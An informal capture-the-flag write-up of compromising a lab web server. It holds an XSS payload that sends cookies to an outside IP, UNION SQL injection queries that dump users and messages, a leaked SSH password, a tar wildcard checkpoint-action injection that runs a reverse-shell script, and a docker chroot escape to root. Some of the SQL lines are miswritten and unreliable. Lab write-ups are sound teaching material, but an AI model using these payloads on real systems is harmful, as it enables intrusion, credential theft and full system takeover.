Started with a nmap scan
```
22 OPenSSH 7.6p1
80 nginx 1.19.2
32768 Node.js
```
Started with a nikto scan on port `80` seeing all `php and js` files
```
/robots.txt has one listing /admin/
/login/
```
Started a nikto scan on port `32768` seeing all `php and js` files
```
/robots.txt has one listing /admin/
```
Running a gobuster on port `80` looking for `php` and `js` files
```
/images 
/new
/login
/signup
/admin
/Login
/messages
/stylesheets
```
Did a nuclei scan did not find anything

If you make a account on one webserver to goes to the other one as well 
The add a new listing has a xss flaw in it `<script>alert(1)</script>` 
I did a burp enumeration on the reports did not find anymore than the ones I made and the ones that were there before
So doing the cookie stealing we did early maybe we can get the admin cookie with a php grabber script and then use there cookie and now we have the cookie for `michael` the grabber script used was `Phpcookiestealing` using this payload
	`<img src=x onerror=this.src='http://10.13.8.255:8000/index.php?cookie='+document.cookie>`
Now we can look at the user list ]
```
administrator     is not admin
michael           is admin
jake              is admin
```
There is a sqli injection on the user list page `1%27` maybe try with user id 0
	`UNION SELECT NULL,NULL,NULL,NULL--`
To get the database name `information_schema,marketplace`
	`union select 1,group_concat(schema_name),3,4 from information_schema.schemata-- -`
To get the table names `items,messages,users`
	``union select 1,group_concat(schema_name),3,4 from information_schema.tables where table_schema='marketplace'-- -``
Now to get the users table
```union select 1,group_concat(schema_name),3,4 from information_schema.tables where table_name='users'-- -```
To dump all the users and we get 3 hashes 
`union select 1,group_concat(id,':',username,':',password,':'isAdministrator,'\n')3,4 from marketplace.users-- -`
Now we cant crack these hashes so lets look at other tables so were going to look at messages 
`union select group_concat(column_name,'/n'),2,3,4 from information_schema.columns where table_name='messages'`
	`id,user_from ,user_to ,message_content, is_read`
And we get a message from the system that a SSH password is weak the new password `@b_ENXkG..........` so now we take the usernames that we know that are on the website and see if we can login
So now we need to get to the user michael we run `sudo -l` and we can run `/opt/backups/backup.sh`
so lets setup are rev shell and make a script and get the user michael to run it take are rev shell script and run these commands 
```
echo "" > "--checkpoint-action=exec=sh 1.sh"
echo "" > --checkpoint=1
rm /opt/backups/backup.tar
sudo -u michael /opt/backups/backup.sh
```
And now we got the user michael and we can see were are inside a docker and michael has access to the docker group so we can go to GTFObins and search docker and use the shell one to get root
	`docker run -v /:/mnt --rm -it alpine chroot/mnt sh`
and now we have root